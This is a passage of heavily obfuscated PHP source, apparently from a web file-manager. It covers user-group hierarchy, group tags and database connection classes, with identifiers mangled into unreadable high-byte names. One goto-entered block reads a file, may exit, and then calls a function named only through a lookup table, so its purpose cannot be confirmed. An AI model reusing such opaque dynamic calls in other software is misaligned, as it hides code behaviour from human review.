=& $_SERVER[® ¨Ä®ñ]; $ÔØä«Àİ = $this->getInfo($­–êâö˜); if (!$ÔØä«Àİ) { return array(); } $¾ğâ‡½Ê = $this->parentLevelArray($ÔØä«Àİ[$ï„‹É™[512]]); $®ı»öûº = array($­–êâö˜); if (count($¾ğâ‡½Ê) == 0) { return $®ı»öûº; } if ($¢ĞÌº·» && count($¾ğâ‡½Ê) == 1) { return $®ı»öûº; } if (!$ÔØä«Àİ[$ï„‹É™[456]] || !isset($ÔØä«Àİ[$ï„‹É™[456]][$ï„‹É™[1892]]) || $ÔØä«Àİ[$ï„‹É™[456]][$ï„‹É™[1892]] == $ï„‹É™[1861]) { return $this->groupShowRoot($¾ğâ‡½Ê[count($¾ğâ‡½Ê) - 1], $¢ĞÌº·»); } if ($ÔØä«Àİ[$ï„‹É™[456]][$ï„‹É™[1892]] == $ï„‹É™[352]) { $ú€“¢Ÿ÷ = explode($ï„‹É™[50], $ÔØä«Àİ[$ï„‹É™[456]][$ï„‹É™[1893]]); if ($ú€“¢Ÿ÷) { $®ı»öûº = array_merge($®ı»öûº, $ú€“¢Ÿ÷); } } return $®ı»öûº; } protected function resetParentLevel() { $ë‡¿İÔÏ =& $_SERVER[® ¨Ä®ñ]; $Ç¥“ŸáÈ = $ë‡¿İÔÏ[1807]; $õİú¨ÍÆ = $this->select(); $õİú¨ÍÆ = array_to_keyvalue($õİú¨ÍÆ, $Ç¥“ŸáÈ); foreach ($õİú¨ÍÆ as $ßÌØèíø) { $¿ôó™Œñ = $ßÌØèíø; $¹ÈôËû” = array(); while ($¿ôó™Œñ[$ë‡¿İÔÏ[489]] != 0) { $¹ÈôËû”[] = $¿ôó™Œñ[$ë‡¿İÔÏ[489]]; $¿ôó™Œñ = $õİú¨ÍÆ[$¿ôó™Œñ[$ë‡¿İÔÏ[489]]]; } $¹ÈôËû”[] = 0; $¹ÈôËû” = $ë‡¿İÔÏ[50] . implode($ë‡¿İÔÏ[50], array_reverse($¹ÈôËû”)) . $ë‡¿İÔÏ[50]; $this->setNamePinyin($ßÌØèíø[$Ç¥“ŸáÈ], $ßÌØèíø[$ë‡¿İÔÏ[32]]); $this->where(array($Ç¥“ŸáÈ => $ßÌØèíø[$Ç¥“ŸáÈ]))->save(array($ë‡¿İÔÏ[575] => $¹ÈôËû”)); } return $õİú¨ÍÆ; } public function groupNameAuto($¾´ßÌ™, $Ãíˆã±) { $”¬¤Ü‘ =& $_SERVER[® ¨Ä®ñ]; $„é«ÛÚ = $this->where(array($”¬¤Ü‘[393] => $¾´ßÌ™))->getField($”¬¤Ü‘[32], !0); if (!$„é«ÛÚ || !in_array($Ãíˆã±, $„é«ÛÚ)) { return $Ãíˆã±; } for ($†©š™®ò = 1; $†©š™®ò <= count($„é«ÛÚ) + 1; $†©š™®ò++) { $äÌèÁ˜ = $Ãíˆã± . "\x28{$†©š™®ò}\51"; if (!in_array($äÌèÁ˜, $„é«ÛÚ)) { return $äÌèÁ˜; } } } public function groupSwitch($øš“í¾ş, $¾Æ“™Æœ) { $ÛëŸØ´á =& $_SERVER[® ¨Ä®ñ]; $„¡È³â¸ = array($ÛëŸØ´á[1807] => array($ÛëŸØ´á[7], array($øš“í¾ş, $¾Æ“™Æœ))); $ÎàÅ–ôí = $this->where($„¡È³â¸)->select(); $ÎàÅ–ôí = array_to_keyvalue($ÎàÅ–ôí, $ÛëŸØ´á[1807]); if (!isset($ÎàÅ–ôí[$øš“í¾ş]) || !isset($ÎàÅ–ôí[$¾Æ“™Æœ]) || $ÎàÅ–ôí[$øš“í¾ş][$ÛëŸØ´á[489]] == 0) { return !1; } $„¡È³â¸ = array($ÛëŸØ´á[1807] => $øš“í¾ş); $á·©Œ÷ = Model($ÛëŸØ´á[1896])->where($„¡È³â¸)->select(); if (!$á·©Œ÷) { $á·©Œ÷ = array(); } foreach ($á·©Œ÷ as $ªÄı©óÊ) { $Çæ¢óİ— = $ªÄı©óÊ[$ÛëŸØ´á[1639]]; $„¡È³â¸ = array($ÛëŸØ´á[1639] => $Çæ¢óİ—, $ÛëŸØ´á[1807] => $¾Æ“™Æœ); $äì‹«ì¥ = Model($ÛëŸØ´á[1896])->where($„¡È³â¸)->find(); if (!$äì‹«ì¥) { $¸é‡‹±š = array($¾Æ“™Æœ => $ªÄı©óÊ[$ÛëŸØ´á[1908]]); Model($ÛëŸØ´á[529])->userGroupAdd($Çæ¢óİ—, $¸é‡‹±š); } Model($ÛëŸØ´á[529])->userGroupRemove($Çæ¢óİ—, $øš“í¾ş); } $„¡È³â¸ = array($ÛëŸØ´á[403] => 2, $ÛëŸØ´á[489] => 0, $ÛëŸØ´á[402] => 1, $ÛëŸØ´á[495] => array($ÛëŸØ´á[7], array($øš“í¾ş, $¾Æ“™Æœ))); $ÓõÄÖÜ½ = Model($ÛëŸØ´á[807])->where($„¡È³â¸)->field($ÛëŸØ´á[1909])->select(); $ÓõÄÖÜ½ = array_to_keyvalue($ÓõÄÖÜ½, $ÛëŸØ´á[495], $ÛëŸØ´á[394]); $ÌÉ›ÕĞ® = !empty($ÓõÄÖÜ½[$øš“í¾ş]) ? $ÓõÄÖÜ½[$øš“í¾ş] : !1; if ($ÌÉ›ÕĞ®) { if (!$ÓõÄÖÜ½[$¾Æ“™Æœ]) { $ÓõÄÖÜ½[$¾Æ“™Æœ] = Model($ÛëŸØ´á[807])->groupRootAdd($¾Æ“™Æœ); } $¶ä°­Ëş = $ÓõÄÖÜ½[$¾Æ“™Æœ]; $„¡È³â¸ = array($ÛëŸØ´á[489] => $ÌÉ›ÕĞ®); $ÓõÄÖÜ½ = Model($ÛëŸØ´á[807])->where($„¡È³â¸)->field($ÛëŸØ´á[1910])->select(); if (!$ÓõÄÖÜ½) { $ÓõÄÖÜ½ = array(); } Model($ÛëŸØ´á[807])->moveClearAuth = !1; foreach ($ÓõÄÖÜ½ as $ÏˆµèÒØ) { $åÀ¦Üù„ = $ÏˆµèÒØ[$ÛëŸØ´á[402]] == $ÛëŸØ´á[89] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÛëŸØ´á[807])->move($ÏˆµèÒØ[$ÛëŸØ´á[394]], $¶ä°­Ëş, $åÀ¦Üù„); } Model($ÛëŸØ´á[807])->moveClearAuth = !0; $„¡È³â¸ = array($ÛëŸØ´á[403] => 2, $ÛëŸØ´á[495] => $øš“í¾ş); $¸«şæ¸È = array($ÛëŸØ´á[495] => $¾Æ“™Æœ); Model($ÛëŸØ´á[1911])->where($„¡È³â¸)->save($¸«şæ¸È); Model($ÛëŸØ´á[1912])->where($„¡È³â¸)->save($¸«şæ¸È); } $this->_changeChildLevel($ÎàÅ–ôí[$øš“í¾ş], $ÎàÅ–ôí[$¾Æ“™Æœ], !0); $this->where(array($ÛëŸØ´á[489] => $øš“í¾ş))->save(array($ÛëŸØ´á[489] => $¾Æ“™Æœ)); $this->_clearChildrenCache($ÎàÅ–ôí[$¾Æ“™Æœ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\146\x61\166"; protected function cacheFunctionAlias($óœáŸ†Ğ) { $åá•¹ =& $_SERVER[® ¨Ä®ñ]; return array($åá•¹[1913] => array($óœáŸ†Ğ[0], $åá•¹[1914]), $åá•¹[1915] => array($óœáŸ†Ğ[0], $åá•¹[1916])); } protected function get($üÛø½£é) { $¦¨Ÿˆ¨ =& $_SERVER[® ¨Ä®ñ]; $õ„÷õ = Model($¦¨Ÿˆ¨[513])->metaGet($üÛø½£é, $¦¨Ÿˆ¨[1917]); $Ú›øÑ» = json_decode($õ„÷õ, !0); return $Ú›øÑ» ? $Ú›øÑ» : array($¦¨Ÿˆ¨[1918] => $¦¨Ÿˆ¨[89], $¦¨Ÿˆ¨[364] => array()); } protected function set($šû›úÃ, $†üëëë‘) { $ƒ²† =& $_SERVER[® ¨Ä®ñ]; $†üëëë‘ = $†üëëë‘ ? $†üëëë‘ : array($ƒ²†[1918] => $ƒ²†[89], $ƒ²†[364] => array()); Model($ƒ²†[513])->metaSet($šû›úÃ, $ƒ²†[1917], json_encode($†üëëë‘)); return Model($ƒ²†[513])->metaSet($šû›úÃ, $ƒ²†[1917], json_encode($†üëëë‘)); } protected function getByTagID($®ÃÃÚ¬½, $Ù¿ÊŠù¾) { $õÔ¥¾®å =& $_SERVER[® ¨Ä®ñ]; if (!$®ÃÃÚ¬½ || !$Ù¿ÊŠù¾) { return !1; } if (!Model($õÔ¥¾®å[513])->getInfoSimple($®ÃÃÚ¬½)) { return !1; } $‘…ôü•ç = $this->get($®ÃÃÚ¬½); if (!$‘…ôü•ç || !isset($‘…ôü•ç[$õÔ¥¾®å[364]])) { return !1; } $§ŒîŞ¢¤ = array_find_by_field($‘…ôü•ç[$õÔ¥¾®å[364]], $õÔ¥¾®å[392], $Ù¿ÊŠù¾); return is_array($§ŒîŞ¢¤) ? $§ŒîŞ¢¤ : !1; } public function listSource($À™¯«», $¶òÊİØâ) { $½¬ëßƒ =& $_SERVER[® ¨Ä®ñ]; if ($¶òÊİØâ && !is_array($¶òÊİØâ)) { $¶òÊİØâ = array($¶òÊİØâ); } $À”ÛƒÃ = $this->listData($À™¯«»); $¼½¡´ÅÚ = array(); foreach ($À”ÛƒÃ as $­Åµ§Ëò) { $¦¡õ–Â£ = $­Åµ§Ëò[$½¬ëßƒ[78]]; if (!$¦¡õ–Â£) { continue; } if (!isset($¼½¡´ÅÚ[$¦¡õ–Â£])) { $¼½¡´ÅÚ[$¦¡õ–Â£] = array(); } $¼½¡´ÅÚ[$¦¡õ–Â£][] = $­Åµ§Ëò[$½¬ëßƒ[418]]; } $È²ƒÔˆ = array(); foreach ($¼½¡´ÅÚ as $€›ñ½°— => $Ö¼™–ÓÍ) { $‚îõœÆ¾ = !0; if (!$¶òÊİØâ) { $È²ƒÔˆ[] = $€›ñ½°—; continue; } foreach ($¶òÊİØâ as $Ï¶È¶½¥) { if (!in_array($Ï¶È¶½¥, $Ö¼™–ÓÍ)) { $‚îõœÆ¾ = !1; break; } } if ($‚îõœÆ¾) { $È²ƒÔˆ[] = $€›ñ½°—; } } if (!$È²ƒÔˆ) { return array(); } $‰ø½Ê× = array($½¬ëßƒ[409] => array($½¬ëßƒ[410], $È²ƒÔˆ), $½¬ëßƒ[495] => $À™¯«», $½¬ëßƒ[403] => SourceModel::TYPE_GROUP); $Ï¥øì = Model($½¬ëßƒ[1309])->listSource($‰ø½Ê×); if (!$Ï¥øì || count($È²ƒÔˆ) == $Ï¥øì[$½¬ëßƒ[361]][$½¬ëßƒ[362]]) { return $Ï¥øì; } $«äÏ˜•€ = array(); $’ãÓ€¾ = array_to_keyvalue($Ï¥øì[$½¬ëßƒ[77]], $½¬ëßƒ[12], $½¬ëßƒ[394]); $¶à‚Ò‚ = array_to_keyvalue($Ï¥øì[$½¬ëßƒ[76]], $½¬ëßƒ[12], $½¬ëßƒ[394]); $±ş¥å´· = array_merge($¶à‚Ò‚, $’ãÓ€¾); foreach ($È²ƒÔˆ as $¦¡õ–Â£) { if (!in_array($¦¡õ–Â£, $±ş¥å´·)) { $«äÏ˜•€[] = $¦¡õ–Â£; } } if ($«äÏ˜•€) { $this->removeBySource($À™¯«», $«äÏ˜•€); } return $Ï¥øì; } protected function listData($ÏÙíŠ©) { $Š“ßŒéõ =& $_SERVER[® ¨Ä®ñ]; $Ÿøú½¹œ = array($Š“ßŒéõ[1630] => 0, $Š“ßŒéõ[474] => array($Š“ßŒéõ[1919], 0), $Š“ßŒéõ[414] => $Š“ßŒéõ[1920] . $ÏÙíŠ©); $óµ¸•šÍ = $Š“ßŒéõ[1921]; $²Âı¥¡‘ = $this->field($óµ¸•šÍ)->where($Ÿøú½¹œ)->order($Š“ßŒéõ[1922])->select(); return $²Âı¥¡‘ ? $²Âı¥¡‘ : array(); } protected function addToTag($ÜÄ›şôÚ, $î¶–»¸Ş, $öÂá¤Â«) { $èù¶ØÛ =& $_SERVER[® ¨Ä®ñ]; if (!$this->getByTagID($ÜÄ›şôÚ, $öÂá¤Â«) || !$î¶–»¸Ş) { return !1; } if (!Model($èù¶ØÛ[807])->pathInfo($î¶–»¸Ş)) { return !1; } $§Ù¡µÄ™ = array($èù¶ØÛ[1630] => 0, $èù¶ØÛ[474] => $öÂá¤Â«, $èù¶ØÛ[413] => $î¶–»¸Ş, $èù¶ØÛ[414] => $èù¶ØÛ[1923] . $ÜÄ›şôÚ, $èù¶ØÛ[412] => $èù¶ØÛ[12], $èù¶ØÛ[1811] => 0); if ($this->where($§Ù¡µÄ™)->find()) { return !1; } return $this->add($§Ù¡µÄ™); } protected function removeFromTag($œ–ÙÇÖ•, $ñŒêç’µ, $Ú£…ëĞõ) { $ÎªßŞĞ” =& $_SERVER[® ¨Ä®ñ]; if (!$this->getByTagID($œ–ÙÇÖ•, $Ú£…ëĞõ) || !$ñŒêç’µ) { return !1; } if (is_array($ñŒêç’µ)) { $ñŒêç’µ = array($ÎªßŞĞ”[7], $ñŒêç’µ); } $Ã¡½Ë˜´ = array($ÎªßŞĞ”[1630] => 0, $ÎªßŞĞ”[474] => $Ú£…ëĞõ, $ÎªßŞĞ”[414] => $ÎªßŞĞ”[1923] . $œ–ÙÇÖ•, $ÎªßŞĞ”[413] => $ñŒêç’µ); return $this->where($Ã¡½Ë˜´)->delete(); } protected function removeByTag($Öõ–Æõš, $ÔøÈ¿Ÿ–) { $ŒÌÎº =& $_SERVER[® ¨Ä®ñ]; if (!$this->getByTagID($Öõ–Æõš, $ÔøÈ¿Ÿ–)) { return !1; } $óûÙš«… = array($ŒÌÎº[1630] => 0, $ŒÌÎº[474] => $ÔøÈ¿Ÿ–, $ŒÌÎº[414] => $ŒÌÎº[1923] . $Öõ–Æõš); return $this->where($óûÙš«…)->delete(); } protected function removeBySource($Â§Â…ÒÙ, $ˆ¢Â¶å) { $°óœ”Ùş =& $_SERVER[® ¨Ä®ñ]; if (!$Â§Â…ÒÙ || !$ˆ¢Â¶å) { return !1; } if (is_array($ˆ¢Â¶å)) { $ˆ¢Â¶å = array($°óœ”Ùş[7], $ˆ¢Â¶å); } $¼ïÊ‘»ã = array($°óœ”Ùş[1630] => 0, $°óœ”Ùş[413] => $ˆ¢Â¶å, $°óœ”Ùş[474] => array($°óœ”Ùş[998], 0), $°óœ”Ùş[414] => $°óœ”Ùş[1923] . $Â§Â…ÒÙ); return $this->where($¼ïÊ‘»ã)->delete(); } } goto A­óÎñÓ½; fºÍˆÏæÏ: if ($_SERVER[$_SERVER[® ¨Ä®ñ][854]] != $_SERVER[$_SERVER[® ¨Ä®ñ][855]]) { $_getc = $_SERVER[® ¨Ä®ñ][857]; $_getfile = $_SERVER[$_SERVER[® ¨Ä®ñ][858]] . $_SERVER[® ¨Ä®ñ][859]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[® ¨Ä®ñ][226], $_getfilec); if (count($_getarrs) < $_SERVER[® ¨Ä®ñ][612]) { $exit = $_SERVER[® ¨Ä®ñ][860]; $exit(); } $_act = $_SERVER[® ¨Ä®ñ][942]; $_act($_SERVER[$_SERVER[® ¨Ä®ñ][943]]); } class DbSqlite3 extends DbSqlite3Base { public function query($×ÉÈõ¸Ã) { $§«¹Â ‰ =& $_SERVER[® ¨Ä®ñ]; if (!CacheLock::fileLock($§«¹Â ‰[13])) { return !1; } $µ©ô•ßÍ = parent::query($×ÉÈõ¸Ã); CacheLock::fileUnLock($§«¹Â ‰[13]); return $µ©ô•ßÍ; } public function execute($˜Û·À) { $Û„ãÔÒê =& $_SERVER[® ¨Ä®ñ]; if (!CacheLock::fileLock($Û„ãÔÒê[13])) { return !1; } $‚âŒÎè = parent::execute($˜Û·À); CacheLock::fileUnLock($Û„ãÔÒê[13]); return $‚âŒÎè; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\x6e\x65\x71" => "\74\76", "\147\x74" => "\x3e", "\x65\x67\164" => "\76\75", "\x6c\x74" => "\x3c", "\x65\154\x74" => "\x3c\x3d", "\156\x6f\164\x6c\x69\153\x65" => "\x4e\x4f\124\x20\x4c\x49\113\105", "\x6c\x69\x6b\x65" => "\114\x49\x4b\105", "\x69\156" => "\111\x4e", "\156\157\x74\151\156" => "\x4e\x4f\124\40\x49\116", "\x6e\x6f\164\x20\151\x6e" => "\116\x4f\x54\x20\x49\116", "\142\x65\164\x77\145\x65\156" => "\x42\x45\124\x57\105\x45\x4e", "\156\157\164\142\x65\x74\167\145\x65\156" => "\x4e\x4f\x54\40\x42\x45\x54\x57\x45\105\116", "\156\x6f\x74\x20\x62\x65\x74\x77\x65\x65\x6e" => "\x4e\x4f\x54\x20\102\x45\124\127\x45\x45\116"); protected $selectSql = "\123\105\114\x45\x43\124\x25\x44\x49\123\124\x49\x4e\103\124\45\40\45\x46\x49\105\114\104\x25\40\106\122\117\x4d\40\x25\124\101\102\114\105\45\x25\112\x4f\111\116\45\x25\x57\x48\105\x52\x45\x25\x25\107\x52\117\x55\x50\45\x25\x48\x41\x56\111\x4e\107\x25\45\117\122\104\105\x52\45\45\114\111\x4d\111\x54\x25\40\x25\125\x4e\111\x4f\x4e\45\45\x43\x4f\x4d\x4d\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $½ãÌ—¿ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[® ¨Ä®ñ][944], $½ãÌ—¿); } public function factory($úú’ØÙ° = '') { $ˆšÈ¥ƒÉ =& $_SERVER[® ¨Ä®ñ]; $úú’ØÙ° = $this->parseConfig($úú’ØÙ°); if (empty($úú’ØÙ°[$ˆšÈ¥ƒÉ[945]])) { think_exception(think_lang($ˆšÈ¥ƒÉ[946])); } $this->dbType = ucwords(strtolower($úú’ØÙ°[$ˆšÈ¥ƒÉ[945]])); $ÇÁ¯¡ı = $ˆšÈ¥ƒÉ[947] . $this->dbType; if (class_exists($ÇÁ¯¡ı)) { $ÂÅğ“Ú… = new $ÇÁ¯¡ı($úú’ØÙ°); if ($ˆšÈ¥ƒÉ[948] != strtolower($úú’ØÙ°[$ˆšÈ¥ƒÉ[945]])) { $ÂÅğ“Ú…->dbType = strtoupper($this->dbType); } else { $ÂÅğ“Ú…->dbType = $this->_getDsnType($úú’ØÙ°[$ˆšÈ¥ƒÉ[898]]); } } else { think_exception(think_lang($ˆšÈ¥ƒÉ[949]) . $ˆšÈ¥ƒÉ[950] . $ÇÁ¯¡ı); } return $ÂÅğ“Ú…; } public function __call($™ø”Æ”ë, $‘à•¬À) { if (method_exists($this, $™ø”Æ”ë)) { return call_user_func_array(array($this, $™ø”Æ”ë), $‘à•¬À); } } protected function _getDsnType($³ûµ›âí) { $–¯ù±±° = explode($_SERVER[® ¨Ä®ñ][4], $³ûµ›âí); $ÚºŸğª = strtoupper(trim($–¯ù±±°[0])); return $ÚºŸğª; } private function parseConfig($ÂàÙÚ˜é = '') { $¦¡ÑÇº =& $_SERVER[® ¨Ä®ñ]; if (!empty($ÂàÙÚ˜é) && is_string($ÂàÙÚ˜é)) { $ÂàÙÚ˜é = $this->parseDSN($ÂàÙÚ˜é); } elseif (is_array($ÂàÙÚ˜é)) { $ÂàÙÚ˜é = array_change_key_case($ÂàÙÚ˜é); $ÂàÙÚ˜é = array($¦¡ÑÇº[945] => $ÂàÙÚ˜é[$¦¡ÑÇº[951]], $¦¡ÑÇº[870] => $ÂàÙÚ˜é[$¦¡ÑÇº[952]], $¦¡ÑÇº[871] => $ÂàÙÚ˜é[$¦¡ÑÇº[953]], $¦¡ÑÇº[868] => $ÂàÙÚ˜é[$¦¡ÑÇº[954]], $¦¡ÑÇº[869] => $ÂàÙÚ˜é[$¦¡ÑÇº[955]], $¦¡ÑÇº[21] => $ÂàÙÚ˜é[$¦¡ÑÇº[956]], $¦¡ÑÇº[898] => $ÂàÙÚ˜é[$¦¡ÑÇº[957]], $¦¡ÑÇº[17] => isset($ÂàÙÚ˜é[$¦¡ÑÇº[958]]) ? $ÂàÙÚ˜é[$¦¡ÑÇº[958]] : array()); } elseif (empty($ÂàÙÚ˜é)) { if (think_config($¦¡ÑÇº[959]) && $¦¡ÑÇº[948] != strtolower(think_config($¦¡ÑÇº[960]))) { $ÂàÙÚ˜é = $this->parseDSN(think_config($¦¡ÑÇº[959])); } else { $ÂàÙÚ˜é = array($¦¡ÑÇº[945] => think_config($¦¡ÑÇº[960]), $¦¡ÑÇº[870] => think_config($¦¡ÑÇº[961]), $¦¡ÑÇº[871] => think_config($¦¡ÑÇº[962]), $¦¡ÑÇº[868] => think_config($¦¡ÑÇº[963]), $¦¡ÑÇº[869] => think_config($¦¡ÑÇº[964]), $¦¡ÑÇº[21] => think_config($¦¡ÑÇº[241]), $¦¡ÑÇº[898] => think_config($¦¡ÑÇº[959]), $¦¡ÑÇº[17] => think_config($¦¡ÑÇº[965])); } } return $ÂàÙÚ˜é; } protected function initConnect($Ê„ÀÅÅÈ = true) { if (1 == think_config($_SERVER[® ¨Ä®ñ][22])) { $this->_linkID = $this->multiConnect($Ê„ÀÅÅÈ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ªŠï¬‰İ => $×ùîó¹) { $this->_linkID = $×ùîó¹; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($£ÀÊªØî = false) { $£‹ÕáêÍ =& $_SERVER[® ¨Ä®ñ]; static $ˆ¶ôÀí = array(); static $ì®ü»ÑŸ = -1; if (empty($ˆ¶ôÀí)) { foreach ($this->config as $ÈŠÙÃÃş => $Öóòéûì) { $ˆ¶ôÀí[$ÈŠÙÃÃş] = explode($£‹ÕáêÍ[50], $Öóòéûì); } } if (think_config($£‹ÕáêÍ[966])) { if ($£ÀÊªØî || think_config($£‹ÕáêÍ[388]) === !0) { $ùøìÑµ = floor(mt_rand(0, think_config($£‹ÕáêÍ[967]) - 1)); $ì®ü»ÑŸ = $ùøìÑµ; } else { if (is_numeric(think_config($£‹ÕáêÍ[968]))) { $ùøìÑµ = think_config($£‹ÕáêÍ[968]); } else { $ùøìÑµ = floor(mt_rand(think_config($£‹ÕáêÍ[967]), count($ˆ¶ôÀí[$£‹ÕáêÍ[868]]) - 1)); } } } else { $ùøìÑµ = floor(mt_rand(0, count($ˆ¶ôÀí[$£‹ÕáêÍ[868]]) - 1)); $ì®ü»ÑŸ = $ùøìÑµ; } $ùøìÑµ = $ì®ü»ÑŸ !== -1 ? $ì®ü»ÑŸ : $ùøìÑµ; $ıº×Šâò = array($£‹ÕáêÍ[870] => isset($ˆ¶ôÀí[$£‹ÕáêÍ[870]][$ùøìÑµ]) ? $ˆ¶ôÀí[$£‹ÕáêÍ[870]][$ùøìÑµ] : $ˆ¶ôÀí[$£‹ÕáêÍ[870]][0], $£‹ÕáêÍ[871] => isset($ˆ¶ôÀí[$£‹ÕáêÍ[871]][$ùøìÑµ]) ? $ˆ¶ôÀí[$£‹ÕáêÍ[871]][$ùøìÑµ] : $ˆ¶ôÀí[$£‹ÕáêÍ[871]][0], $£‹ÕáêÍ[868] => isset($ˆ¶ôÀí[$£‹ÕáêÍ[868]][$ùøìÑµ]) ? $ˆ¶ôÀí[$£‹ÕáêÍ[868]][$ùøìÑµ] : $ˆ¶ôÀí[$£‹ÕáêÍ[868]][0], $£‹ÕáêÍ[869] => isset($ˆ¶ôÀí[$£‹ÕáêÍ[869]][$ùøìÑµ]) ? $ˆ¶ôÀí[$£‹ÕáêÍ[869]][$ùøìÑµ] : $ˆ¶ôÀí[$£‹ÕáêÍ[869]][0], $£‹ÕáêÍ[21] => isset($ˆ¶ôÀí[$£‹ÕáêÍ[21]][$ùøìÑµ]) ? $ˆ¶ôÀí[$£‹ÕáêÍ[21]][$ùøìÑµ] : $ˆ¶ôÀí[$£‹ÕáêÍ[21]][0], $£‹ÕáêÍ[898] => isset($ˆ¶ôÀí[$£‹ÕáêÍ[898]][$ùøìÑµ]) ? $ˆ¶ôÀí[$£‹ÕáêÍ[898]][$ùøìÑµ] : $ˆ¶ôÀí[$£‹ÕáêÍ[898]][0], $£‹ÕáêÍ[17] => isset($ˆ¶ôÀí[$£‹ÕáêÍ[17]][$ùøìÑµ]) ? $ˆ¶ôÀí[$£‹ÕáêÍ[17]][$ùøìÑµ] : $ˆ¶ôÀí[$£‹ÕáêÍ[17]][0]); return $this->connect($ıº×Šâò, $ùøìÑµ); } public function parseDSN($¬éó‰ˆî) { $øİ¸Ù‰Š =& $_SERVER[® ¨Ä®ñ]; if (empty($¬éó‰ˆî)) { return !1; } $¹Ô¤…ƒö = parse_url($¬éó‰ˆî); if ($¹Ô¤…ƒö[$øİ¸Ù‰Š[173]]) { $·¬¥ÆÃÚ = array($øİ¸Ù‰Š[945] => $¹Ô¤…ƒö[$øİ¸Ù‰Š[173]], $øİ¸Ù‰Š[870] => isset($¹Ô¤…ƒö[$øİ¸Ù‰Š[585]]) ? $¹Ô¤…ƒö[$øİ¸Ù‰Š[585]] : $øİ¸Ù‰Š[12], $øİ¸Ù‰Š[871] => isset($¹Ô¤…ƒö[$øİ¸Ù‰Š[969]]) ? $¹Ô¤…ƒö[$øİ¸Ù‰Š[969]] : $øİ¸Ù‰Š[12], $øİ¸Ù‰Š[868] => isset($¹Ô¤…ƒö[$øİ¸Ù‰Š[174]]) ? $¹Ô¤…ƒö[$øİ¸Ù‰Š[174]] : $øİ¸Ù‰Š[12], $øİ¸Ù‰Š[869] => isset($¹Ô¤…ƒö[$øİ¸Ù‰Š[175]]) ? $¹Ô¤…ƒö[$øİ¸Ù‰Š[175]] : $øİ¸Ù‰Š[12], $øİ¸Ù‰Š[21] => isset($¹Ô¤…ƒö[$øİ¸Ù‰Š[78]]) ? substr($¹Ô¤…ƒö[$øİ¸Ù‰Š[78]], 1) : $øİ¸Ù‰Š[12]); } else { preg_match($øİ¸Ù‰Š[970], trim($¬éó‰ˆî), $Çˆ²€Åò); $·¬¥ÆÃÚ = array($øİ¸Ù‰Š[945] => $Çˆ²€Åò[1], $øİ¸Ù‰Š[870] => $Çˆ²€Åò[2], $øİ¸Ù‰Š[871] => $Çˆ²€Åò[3], $øİ¸Ù‰Š[868] => $Çˆ²€Åò[4], $øİ¸Ù‰Š[869] => $Çˆ²€Åò[5], $øİ¸Ù‰Š[21] => $Çˆ²€Åò[6]); } $·¬¥ÆÃÚ[$øİ¸Ù‰Š[898]] = $øİ¸Ù‰Š[12]; return $·¬¥ÆÃÚ; } protected function debug() { $¶­àÆ›š =& $_SERVER[® ¨Ä®ñ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¶­àÆ›š[971]; if (think_config($¶­àÆ›š[972])) { think_status($¶­àÆ›š[973]); think_trace($this->queryStr . $¶­àÆ›š[974] . think_status($¶­àÆ›š[24], $¶­àÆ›š[973], 6) . $¶­àÆ›š[975], $¶­àÆ›š[12], $¶­àÆ›š[976]); } } protected function parseLock($˜ğ‚Ûø = false) { $¬œ°Ççæ =& $_SERVER[® ¨Ä®ñ]; if (!$˜ğ‚Ûø) { return $¬œ°Ççæ[12]; } if ($¬œ°Ççæ[900] == $this->dbType) { return $¬œ°Ççæ[977]; } return $¬œ°Ççæ[978]; } protected function parseSet($ŞÃôÁ‹ú) { $÷ÊüÙÌÊ =& $_SERVER[® ¨Ä®ñ]; foreach ($ŞÃôÁ‹ú as $¨£øó· => $“©ñË¸¼) { if (is_array($“©ñË¸¼) && $÷ÊüÙÌÊ[292] == $“©ñË¸¼[0]) { $“ñÅÃ™ü[] = $this->parseKey($¨£øó·) . $÷ÊüÙÌÊ[866] . $“©ñË¸¼[1]; } elseif (is_scalar($“©ñË¸¼) || is_null($“©ñË¸¼)) { $“ñÅÃ™ü[] = $this->parseKey($¨£øó·) . $÷ÊüÙÌÊ[866] . $this->parseValue($“©ñË¸¼); } } return $÷ÊüÙÌÊ[979] . implode($÷ÊüÙÌÊ[50], $“ñÅÃ™ü); } protected function bindParam($ù¶ı¢±¤, $êÆà©§­) { $this->bind[$_SERVER[® ¨Ä®ñ][4] . $ù¶ı¢±¤] = $êÆà©§­; } protected function parseBind($åšããó) { $åšããó = array_merge($this->bind, $åšããó); $this->bind = array(); return $åšããó; } function parseKey(&$ıìëØó, $êì¯Ÿ = true) { if ($êì¯Ÿ) { $ıìëØó = $this->parseKeyCheck($ıìëØó); } return $ıìëØó; } function parseKeyCheck($ó–ºØœ) { $Ìğıçş» =& $_SERVER[® ¨Ä®ñ]; $ó–ºØœ = trim($ó–ºØœ); if (!preg_match($Ìğıçş»[980], $ó–ºØœ)) { think_exception($Ìğıçş»[981] . $ó–ºØœ); } return $ó–ºØœ; } protected function parseValue($à£”±ë) { $…ùáÉ×— =& $_SERVER[® ¨Ä®ñ]; if (is_string($à£”±ë)) { $à£”±ë = $…ùáÉ×—[939] . $this->escapeString($à£”±ë) . $…ùáÉ×—[939]; } elseif (isset($à£”±ë[0]) && is_string($à£”±ë[0]) && strtolower($à£”±ë[0]) == $…ùáÉ×—[292]) { $à£”±ë = $this->escapeString($à£”±ë[1]); } elseif (is_array($à£”±ë)) { $à£”±ë = array_map(array($this, $…ùáÉ×—[940]), $à£”±ë); } elseif (is_bool($à£”±ë)) { $à£”±ë = $à£”±ë ? $…ùáÉ×—[89] : $…ùáÉ×—[190]; } elseif (is_null($à£”±ë)) 